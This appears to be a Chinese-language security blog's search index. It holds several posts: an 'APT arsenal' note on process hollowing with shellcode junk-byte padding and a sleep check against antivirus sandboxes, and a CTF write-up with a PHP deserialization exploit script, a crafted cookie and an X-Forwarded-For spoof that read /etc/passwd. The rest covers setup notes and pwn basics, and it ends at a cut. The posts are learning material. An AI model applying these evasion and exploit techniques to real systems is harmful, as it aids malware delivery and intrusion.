<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)</title>
    <link href="/2022/12/07/APT%E6%AD%A6%E5%99%A8%E5%BA%AB1/"/>
    <url>/2022/12/07/APT%E6%AD%A6%E5%99%A8%E5%BA%AB1/</url>
    
    <content type="html"><![CDATA[<h1 id="APT武器庫打造計畫-amp-amp-entry-point-劫持-1"><a href="#APT武器庫打造計畫-amp-amp-entry-point-劫持-1" class="headerlink" title="APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)"></a>APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">最近在練習dll injection、bypassAV一些規避技術，<br>有朋友提到不能使用managed程式去做繞過，否則一定被查殺，<br>於是決定用C++是看看練習刻一個process hollowing出來，<br>技術不到位，可能會有很多錯誤觀念XDD<br></code></pre></td></tr></table></figure><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">通過CreateProcess創建進程，傳入參數CREATE_SUSPENDED使進程掛起<br>通過NtQueryInformationProcess 找出imagebase<br>從ImageBase讀取PE頭信息，再從NTheader中獲取entry point RVA，加上獲取的RVA得到entry point address。<br>通過WriteProcessMemory向內存寫入payload<br>通過ResumeThread喚醒進程，執行payload<br></code></pre></td></tr></table></figure><h3 id="建立一個-Suspended-Process-，-此為注入的目標-Process"><a href="#建立一個-Suspended-Process-，-此為注入的目標-Process" class="headerlink" title="建立一個 Suspended Process ， 此為注入的目標 Process"></a>建立一個 Suspended Process ， 此為注入的目標 Process</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">使用 CreateProcessA 建立Process<br></code></pre></td></tr></table></figure><ul><li>CreateProcessA<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs !">BOOL CreateProcessA(<br>  [in, optional]      LPCSTR                lpApplicationName, //應用程式名稱<br>  [in, out, optional] LPSTR                 lpCommandLine, //命令行字符串<br>  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes, //Process安全屬性<br>  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes, //Thread安全屬性<br>  [in]                BOOL                  bInheritHandles, //是否繼承父進程的屬性<br>  [in]                DWORD                 dwCreationFlags, //創建標誌<br>  [in, optional]      LPVOID                lpEnvironment, //指向新環境塊的Pointer<br>  [in, optional]      LPCSTR                lpCurrentDirectory, //指向當前目錄名的Pointer<br>  [in]                LPSTARTUPINFOA        lpStartupInfo, //傳遞給新進程的信息<br>  [out]               LPPROCESS_INFORMATION lpProcessInformation //新進程返回的信息<br>);<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">使用 CreateProcessA 建立 Process，其中有個重點是第六個參數 dwCreationFlags 必須是 CREATE_SUSPENDED (0x4)，因為需要它維持在初始狀態，讓我們能夠對其中的記憶體進行修改。<br><br>建立了目標 Process後，並把它的記憶體竄改成我們自己的程式後，呼叫 ResumeThread 就可以讓它恢復執行。<br><br>有了目標 Process 的 Handle，就可以取得 PEB，裡面包含後面步驟需要用到的 ImageBaseAddress。<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/8galwew.png"></p><ul><li>LPSTARTUPINFOA &amp;&amp; PROCESS_INFORMATION<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">LPSTARTUPINFOA si是一個指向STARTUPINFOA結構的指標，指定新進程的窗口屬性。 <br>PROCESS_INFORMATION proc_info是一個包含新進程及其主線程信息的結構。它通常用於存儲新進程的進程和線程句柄。<br></code></pre></td></tr></table></figure></li></ul><h3 id="取得imageBase"><a href="#取得imageBase" class="headerlink" title="取得imageBase"></a>取得imageBase</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">NtQueryInformationProcess 函數用於查詢有關特定過程的信息，並將結果存儲在 pbi 結構中。<br><br>第一個參數是一個過程句柄，第二個參數是 ProcessBasicInformation 枚舉值，第三個參數是一個指向 PROCESS_BASIC_INFORMATION 結構的指針，第四個參數是結構的大小，第五個參數是一個指向存儲結果的指針。<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/TjU9iGb.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">dt !_PEB 結構資訊<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/rPu7dw1.png"></p><ul><li>PEB + 0x10位置即是process的imagebase address<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">透過ReadProcessMemory來取得指定記憶體內容<br>LONGLONG imageBaseOffset = (LONGLONG)pbi.PebBaseAddress + 0x10;<br><br>PEB位置加上0x10定位到imagebase<br></code></pre></td></tr></table></figure></li></ul><h3 id="獲取Header頭"><a href="#獲取Header頭" class="headerlink" title="獲取Header頭"></a>獲取Header頭</h3><p><img src="https://i.imgur.com/1Q9RX67.png"></p><h3 id="Shellcode-加密-amp-amp-Sleep-程式"><a href="#Shellcode-加密-amp-amp-Sleep-程式" class="headerlink" title="Shellcode 加密 &amp;&amp; Sleep 程式"></a>Shellcode 加密 &amp;&amp; Sleep 程式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">目前是塞垃圾byte給shellcode<br>並且執行時先讓程式做sleep <br>有些啟發式防毒會將程式丟到模擬器去執行，遇到延遲會快進，<br></code></pre></td></tr></table></figure><ul><li><p>加密方式很多種，目前還在測試中，於是就隨便塞垃圾byte..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs !">unsigned char plain[] = &quot;\xfc\x48\x83\xe4\xf0<br>unsigned char buf[4 * sizeof(plain)];<br><br>    int j = 0;<br><br>    for (int i = 0; i &lt; 4 * sizeof(plain); i++) &#123;<br><br>        if (i % 4 == 0) &#123;<br>            buf[i] = plain[j];<br>            j++;<br>        &#125;<br>        else &#123;<br>            buf[i] = rand() &amp; 15;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>sleep</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs !">auto t1 = std::chrono::system_clock::now();<br>std::this_thread::sleep_for(std::chrono::seconds(2));<br>auto t2 = std::chrono::system_clock::now();<br>auto elapsed_time = std::chrono::duration_cast&lt;std::chrono::seconds&gt;(t2 - t1).count();<br>std::cout &lt;&lt; &quot;Elapsed time: &quot; &lt;&lt; elapsed_time &lt;&lt; &quot; seconds&quot; &lt;&lt; std::endl;<br>if (elapsed_time &lt; 1.5) &#123;<br>    return;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">目前還有太多東西不了解，還需要更多的嘗試才會有更多收穫，<br>繼續學習zzz<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>APT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APT</tag>
      
      <tag>武器庫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WEB-InfoSecCTF2022-Message of the day</title>
    <link href="/2022/12/04/WEB-InfoSecCTF2022-Message%20of%20the%20day/"/>
    <url>/2022/12/04/WEB-InfoSecCTF2022-Message%20of%20the%20day/</url>
    
    <content type="html"><![CDATA[<h1 id="Message-of-the-Day"><a href="#Message-of-the-Day" class="headerlink" title="Message of the Day"></a>Message of the Day</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">題目首頁顯示 You are not allowed to access.<br>先用dirsearch爆破目錄<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ghSzYSu.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">發現backup.zip<br>裡面有三個檔案 client.php read.php index.php<br></code></pre></td></tr></table></figure><ul><li><p>index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br><br>include(&#x27;client.php&#x27;);<br><br>function getIP()<br>&#123;<br>    if (!empty($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]))<br>    &#123;<br>      $ip=$_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];<br>    &#125;<br>    else<br>    &#123;<br>      $ip=$_SERVER[&#x27;REMOTE_ADDR&#x27;];<br>    &#125;<br>    return $ip;<br>&#125;<br><br>if (getIP() == &#x27;127.0.0.1&#x27;) &#123;<br>if (!isset($_COOKIE[&#x27;client&#x27;])) &#123;<br>setcookie(&quot;client&quot;, base64_encode(serialize(new Client(&#x27;Guest&#x27;))));<br>&#125; else &#123;<br>unserialize(base64_decode($_COOKIE[&#x27;client&#x27;]));<br>&#125;<br>&#125;<br>else &#123;<br>header(&#x27;HTTP/1.0 403 Forbidden&#x27;);<br>    die(&#x27;You are not allowed to access.&#x27;);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure></li><li><p>read.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br>class Read &#123;<br><br>// Still in development phase<br><br>private $file_name;<br><br>public function print($val) &#123;<br>include($this-&gt;file_name);<br>echo $val;<br>&#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure></li><li><p>client.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br>include(&#x27;read.php&#x27;);<br><br>class Client &#123;<br><br>private $name;<br>private $tmp;<br><br>function __construct($name) &#123;<br>$this-&gt;name = $name;<br>$this-&gt;tmp = new Message();<br>&#125;<br><br>function __destruct() &#123;<br>$this-&gt;tmp-&gt;print($this-&gt;name);<br>&#125;<br>&#125;<br><br>class Message &#123;<br><br>public function print($val) &#123;<br>echo &quot;Tigers and bears may be stronger predators, but wolves don&#x27;t perform in circus, &quot;. $val .&quot;!&quot;;<br>&#125;<br><br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">拿到三個文件的<span class="hljs-built_in">source</span> code<br>首先會利用<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] 抓取使用者<br>使用者可控的header都不安全<br>可用X-Forwarded-For: 127.0.0.1 繞過<br><br>接著會對cookie裡面的內容做反序列化<br>unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;client&#x27;</span>]));<br><br>會call Message的Print <span class="hljs-keyword">function</span><br>可改成<span class="hljs-built_in">read</span>的<span class="hljs-built_in">print</span> 並將file_name改成要include的檔案<br></code></pre></td></tr></table></figure><ul><li><p>exp.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br><br>class Read &#123;<br><br>    private $file_name = &#x27;/etc/motd&#x27;;<br><br>    public function print($val) &#123;<br>        include($this-&gt;file_name);<br>        echo $val;<br>    &#125;<br>&#125;<br><br>class Client &#123;<br><br>    private $name;<br>    private $tmp;<br><br>    function __construct($name) &#123;<br>        $this-&gt;name = $name;<br>        $this-&gt;tmp = new Read();<br>    &#125;<br><br>    function __destruct() &#123;<br>        $this-&gt;tmp-&gt;print($this-&gt;name);<br>    &#125;<br><br>&#125;<br><br>class Message &#123;<br><br>    public function print($val) &#123;<br>        echo &quot;Tigers and bears may be stronger predators, but wolves don&#x27;t perform in circus, &quot;. $val .&quot;!&quot;;<br>    &#125;<br><br>&#125;<br><br>$test = new Client(&#x27;/etc/passwd&#x27;);<br><br>$y = base64_encode(serialize($test));<br>echo $y;<br><br>?&gt;<br></code></pre></td></tr></table></figure></li><li><p>requests get flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">根據題意 推測為motd指令 將payload file_name給/etc/motd<br>Cookie: client=Tzo2OiJDbGllbnQiOjI6e3M6MTI6IgBDbGllbnQAbmFtZSI7czoxMToiL2V0Yy9wYXNzd2QiO3M6MTE6IgBDbGllbnQAdG1wIjtPOjQ6IlJlYWQiOjE6e3M6MTU6IgBSZWFkAGZpbGVfbmFtZSI7czo5OiIvZXRjL21vdGQiO319<br><br>X-Forwarded-For: 127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/SeA8DWB.png"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PHP</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GCP安裝Chrome-Remote-Desktop</title>
    <link href="/2022/12/03/Chrome-Remote-Desktop/"/>
    <url>/2022/12/03/Chrome-Remote-Desktop/</url>
    
    <content type="html"><![CDATA[<h1 id="GCP-安裝-Chrome-Remote-Desktop"><a href="#GCP-安裝-Chrome-Remote-Desktop" class="headerlink" title="GCP 安裝 Chrome-Remote-Desktop"></a>GCP 安裝 Chrome-Remote-Desktop</h1><h2 id="環境"><a href="#環境" class="headerlink" title="環境"></a>環境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">GCP N1<br>Ubuntu 22.04 LTS x86_64 <br></code></pre></td></tr></table></figure><h2 id="VPS安裝Chrome遠端桌面"><a href="#VPS安裝Chrome遠端桌面" class="headerlink" title="VPS安裝Chrome遠端桌面"></a>VPS安裝Chrome遠端桌面</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb<br><br>sudo apt-get install --assume-yes ./chrome-remote-desktop_current_amd64.deb<br></code></pre></td></tr></table></figure><h2 id="安裝桌面環境"><a href="#安裝桌面環境" class="headerlink" title="安裝桌面環境"></a>安裝桌面環境</h2><ul><li><p>更新存儲庫</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">sudo apt <span class="hljs-keyword">update</span> <span class="hljs-variable">&amp;&amp;</span> sudo apt upgrade<br></code></pre></td></tr></table></figure></li><li><p>安裝並設置顯示管理器。使用slim是因為它的輕量級特性</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> slim<br></code></pre></td></tr></table></figure></li><li><p>安裝Ubuntu桌面環境</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> ubuntu-desktop<br></code></pre></td></tr></table></figure></li><li><p>安裝完成後，重啟機器</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo reboot</span><br></code></pre></td></tr></table></figure></li><li><p>重啟後會失去連接。再次通過 SSH 進入虛擬機啟動 slim</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo service slim <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="配置Chrome-Remote-Desktop"><a href="#配置Chrome-Remote-Desktop" class="headerlink" title="配置Chrome-Remote-Desktop"></a>配置Chrome-Remote-Desktop</h2><ul><li><p>設定其他電腦，並持續下一步<br><img src="https://i.imgur.com/F8KFXfj.png"></p></li><li><p>將最後一步指令複製到VPS主機上<br><img src="https://i.imgur.com/9UEbfJm.png"></p></li><li><p>輸入六位數PIN，即可成功<br><img src="https://i.imgur.com/iMVL2xA.png"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>筆記</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VPS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwn基礎知識</title>
    <link href="/2022/11/30/Pwn%E5%9F%BA%E7%A4%8E%E7%9F%A5%E8%AD%98/"/>
    <url>/2022/11/30/Pwn%E5%9F%BA%E7%A4%8E%E7%9F%A5%E8%AD%98/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn-Basic"><a href="#Pwn-Basic" class="headerlink" title="Pwn-Basic"></a>Pwn-Basic</h1><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li><p>編譯過程</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">原始碼 Source Code <br>預處理器 Preprocessor (井字號開頭 巨集 ex:<span class="hljs-meta">#<span class="hljs-keyword">include</span> #<span class="hljs-keyword">ifdef</span>... #<span class="hljs-keyword">define</span>)</span><br>編譯器 Compiler (原始語言 <span class="hljs-keyword">to</span> 目標語言 高階轉低階 c <span class="hljs-keyword">to</span> ASM)<br>組譯器 Assembler (將組語轉成目標碼、機器碼，組合語言機器碼一對一對應)<br>目標碼 <span class="hljs-built_in">Object</span> Code (由機器碼組成，俗稱binaries，主要的程式邏輯都在這)<br>連結器 Linker (將多個目標檔連接再一起，成為可執行檔案，分為動態與靜態連結)<br>執行檔 Executables<br></code></pre></td></tr></table></figure></li><li><p>Binary Exploitation</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less">透過一個或多個漏洞利用，取得程式的掌控權<br>目的:<br>取得<span class="hljs-selector-tag">Shell</span><br>讀取、竄改檔案<br><br><span class="hljs-selector-tag">ELF</span>為<span class="hljs-selector-tag">Linux</span>執行檔格式<br><span class="hljs-selector-tag">Section</span> 區分不同功能資料<br>不同功能需要不同的權限、大小<br>程式碼屬於<span class="hljs-selector-class">.text</span> <span class="hljs-selector-tag">section</span>，需要執行權限<br>常數字串屬於 <span class="hljs-selector-class">.rodata</span> <span class="hljs-selector-tag">section</span>，需要讀取權限<br></code></pre></td></tr></table></figure></li><li><p>ELF-Memory Layout</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs fortran">.text 程式碼<br>.rodata read-<span class="hljs-keyword">only</span> <span class="hljs-keyword">data</span>，如字串<br>.<span class="hljs-keyword">data</span> 初始化後的變數<br>.bss  尚未初始化的變數<br>heap  動態記憶體空間<br>lib   <span class="hljs-keyword">Shared</span> library<br>tls   thread <span class="hljs-keyword">local</span> storage<br>stack 堆疊，儲存當前<span class="hljs-function"><span class="hljs-keyword">function</span></span>執行狀態的空間<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/lsfxirB.png"></p></li><li><p>ELF - Protection</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PIE 程式碼相對位址表示，非絕對位址<br>NX .text外的section沒有執行權限<br>Canary Stack結尾塞入隨機數，<span class="hljs-keyword">return</span>前檢查是否遭到修改<br>RELRO 分為 <span class="hljs-keyword">Full</span>/Partial/<span class="hljs-keyword">No</span> 三種型態，分別代表runtime解析外部<span class="hljs-keyword">function</span>時使用的不同機制<br>Seccomp 制定規則禁止或允許特定Syscall<br>ASLR 程式載入時，stack、heap等記憶體區塊會使用隨機位址當作base address(末<span class="hljs-number">12</span>bits固定)<br></code></pre></td></tr></table></figure></li><li><p>Register</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">General Purpose Registers (GPRs)<br><span class="hljs-number">64</span> bit: <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">r8</span> - <span class="hljs-built_in">r15</span><br><span class="hljs-number">32</span> bit: <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">r8d</span> - <span class="hljs-built_in">r15d</span><br><span class="hljs-number">16</span> bit: <span class="hljs-built_in">ax</span>, <span class="hljs-built_in">bx</span>, <span class="hljs-built_in">cx</span>, <span class="hljs-built_in">dx</span>, <span class="hljs-built_in">di</span>, <span class="hljs-built_in">si</span>, <span class="hljs-built_in">r8w</span> - <span class="hljs-built_in">r15w</span><br><span class="hljs-number">8</span>  bit: <span class="hljs-number">ah</span>, <span class="hljs-number">bh</span>, <span class="hljs-number">ch</span>, <span class="hljs-number">dh</span>, <span class="hljs-built_in">al</span>, <span class="hljs-built_in">bl</span>, <span class="hljs-built_in">cl</span>, <span class="hljs-built_in">dl</span>, <span class="hljs-built_in">dil</span>, <span class="hljs-built_in">sil</span>, <span class="hljs-built_in">r8b</span> - <span class="hljs-built_in">r15b</span><br></code></pre></td></tr></table></figure></li><li><p>Calling Convention</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">分為Caller 與 Callee<br><br>Logical address <span class="hljs-number">8</span> bytes代表<br>User space  <span class="hljs-number">0</span> ~ <span class="hljs-number">2</span>^<span class="hljs-number">47</span>-<span class="hljs-number">1</span><br>Kernel space  <span class="hljs-number">2</span>^<span class="hljs-number">64</span> - <span class="hljs-number">2</span>^<span class="hljs-number">47</span> ~ <span class="hljs-number">2</span>^<span class="hljs-number">64</span> - <span class="hljs-number">1</span> <br><br>Linux 呼叫慣例:<br><span class="hljs-built_in">RDI</span> <span class="hljs-built_in">RSI</span> <span class="hljs-built_in">RDX</span> <span class="hljs-built_in">RCX</span> <span class="hljs-built_in">R8</span> <span class="hljs-built_in">R9</span> 其餘stack return值 <span class="hljs-built_in">rax</span><br><br>Windows 呼叫慣例:<br><span class="hljs-built_in">RCX</span> <span class="hljs-built_in">RDX</span> <span class="hljs-built_in">R8</span> <span class="hljs-built_in">R9</span> 多的放stack<br><br>Linux/Win x32:<br>放stack<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/4o0qm7O.png"></p></li><li><p>Prologue&#x2F;Epilogue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs !">Function Prologue<br>為 Function 的起頭，一個 Function 被呼叫時的起手式。<br><br>0x4004d7 PUSH  RBP<br>0x4004d8 MOV   RBP  RSP<br>0x4004de SUB   RSP  0x10<br><br>Function Epilogue<br>為 Function 的結尾，一個 Function 結束生命周期之後的行為，簡單的說就是 Prologue 的逆向，怎麼開始，就怎麼結束。<br><br>0x400508 LEAVE<br>0x400509 RET<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Shibboleth</title>
    <link href="/2022/11/30/HTB-Shibboleth/"/>
    <url>/2022/11/30/HTB-Shibboleth/</url>
    
